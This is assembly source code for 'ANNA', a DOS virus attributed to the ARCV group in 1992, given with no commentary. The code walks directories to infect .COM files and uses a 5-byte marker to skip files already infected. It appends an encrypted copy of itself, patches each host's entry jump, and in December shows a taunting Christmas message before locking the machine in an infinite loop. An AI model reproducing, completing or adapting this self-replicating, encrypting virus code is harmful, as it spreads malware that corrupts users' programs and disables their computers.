
                                Name     ANNA
                                Page 55,132
                                Title ????

len             equ offset marker+5-offset main2
level1len       equ offset level1-offset main3
level2len       equ offset level2-offset main3

code segment 

                assume cs:code,ds:code,es:code

                org 0100h

main:           xor si,si
                call level2
                call level1
                jmp main2
                dd 0h

main2:          call nextline
nextline:       pop ax
                sub ax,offset nextline
                xchg si,ax
                call level1
                call level2
main3:          mov ax,word ptr ds:[oldstart+si]    
                mov cx,word ptr ds:[oldstart+si+2]
                mov ds:[0100h],ax
                mov ds:[0102h],cx

getdate:        mov ah,2ah
                int 21h
                jnc notexit

lexit:          jmp exit

notexit:        cmp dh,0ch
                jne getdir

                jmp activ8

getdir:         mov ah,47h
                mov dl,00h
                push si
                lea bx,(curdir+si)
                mov si,bx
                int 21h
                jc lexit

                pop si
                mov byte ptr ds:[flag+si],00h

setdta:         mov ah,1ah
                lea dx,(buff+si)
                int 21h

findfile:       mov ah,4eh
                mov cx,00h
                lea dx,(search1+si)
                int 21h
                jnc openup

                cmp al,12h
                jne lexit
                jmp next_dir


openup:         mov ah,3dh
                mov al,02h
                lea dx,(buff+1eh+si)
                int 21h
                jc lexit
                mov ds:[handle+si],ax

movepoint:      mov ax,4202h
                mov bx,ds:[handle+si]
                mov cx,0ffffh
                mov dx,0fffbh
                int 21h
                jc lclose
                jmp checkmark 

lclose:         jmp close

checkmark:      mov ah,3fh
                mov bx,ds:[handle+si]
                mov cx,05h
                lea dx,(check+si)
                int 21h
                jc lclose
                lea di,(marker+si)
                lea ax,(check+si)
                xchg si,ax
                mov cx,05h
compare:        cmpsb
                jnz infect
                loop compare
                xchg si,ax
                jmp next_file


infect:         xchg si,ax
                mov ax,4200h
                mov bx,ds:[handle+si]
                xor cx,cx
                xor dx,dx
                int 21h
                jc lclose
                mov ah,3fh
                mov bx,ds:[handle+si]
                lea dx,(oldstart+si)
                mov cx,4
                int 21h
                jc lclose
                mov ax,4202h
                mov bx,ds:[handle+si]
                xor cx,cx
                xor dx,dx
                int 21h
                jc lclose
                sub ax,3h
                mov word ptr ds:[jump+1+si],ax
                call save
                mov ax,4200h
                mov bx,ds:[handle+si]
                xor cx,cx
                xor dx,dx
                int 21h
                mov ah,40h
                mov bx,ds:[handle+si]
                mov cx,3
                lea dx,(jump+si)
                int 21h
                mov ah,3bh
                lea dx,(bkslash+si)
                int 21h


                jmp close

next_dir:       cmp ds:[dir_count],20
                je exit
                mov ah,1ah
                lea dx,(buff2+si)
                int 21h
                mov ah,3bh
                lea dx,(bslsh+si)
                int 21h
                cmp byte ptr ds:[flag+si],00h
                jne nextdir2
                mov byte ptr ds:[flag+si],0ffh
                mov ah,4eh
                lea dx,(search2+si)
                xor cx,cx 
                mov bx,cx
                mov cl,10h
                int 21h
                jc exit
                jmp chdir

nextdir2:       mov ah,4fh
                int 21h
                jc exit

                inc ds:[dir_count+si] 

chdir:          mov ah,3bh
                lea dx,(buff2+1eh+si)
                int 21h
                jmp setdta

activ8:         mov ah,09h
                lea dx,(msg+si)
                int 21h
crash:          jmp crash


close:          mov ah,3eh
                mov bx,ds:[handle+si]
                int 21h
                 
runold:         mov ax,0100h
                jmp ax

next_file:      mov ah,3eh
                mov bx,ds:[handle+si]
                int 21h

                mov ah,4fh
                int 21h
                jc next_dir
                 
                jmp openup

exit:           mov ah,3bh
                lea dx,(curdir+si)
                int 21h
                jmp runold

info            db '[ANNA]',00h
                db 'Slartibartfast, ARCV NuKE the French',00h


msg             db 0dh,0ah,07h,0dh
                db '   Have a Cool Yule from the ARcV',0dh,0ah 
                db '          xCept Anna Jones',0dh,0ah 
                db 'I hope you get run over by a Reindeer',0dh,0ah 
                db '      Santas bringin',39,' you a Bomb',0dh,0ah 
                db '    All my Lurve - SLarTiBarTfAsT',0dh,0ah 
                db '(c) ARcV 1992 - England Raining Again',0dh,0ah
                db '$'

oldstart:       mov ah,4ch
                int 21h

jump            db 0e9h,0,0
flag            db 00h
bslsh           db '\',00h
search2         db '*. ',00h
search1         db '*.com',00h

level2:         lea di,(main3+si)
                mov cx,level2len
enc2:           mov al,byte ptr ds:[di]
                rol al,4
                stosb
                loop enc2
                ret

level1:         lea di,(main3+si)
                mov cx,level1len
inc1:           xor byte ptr ds:[di],01h
key:            inc di
                loop inc1
                ret

save:           inc byte ptr ds:[key-1+si]
                call level2
                call level1
                mov ah,40h
                mov bx,ds:[handle+si]
                mov cx,len
                lea dx,(main2+si)
                int 21h
                call level1
                call level2
                ret


marker          db 'ImIr8'

bkslash         db '\'
curdir          db 64 dup (0)
handle          dw 0h
buff            db 60h dup (0)
buff2           db 60h dup (0)
check           db 5 dup (?) 
dir_count       dw 0h



code ends

end main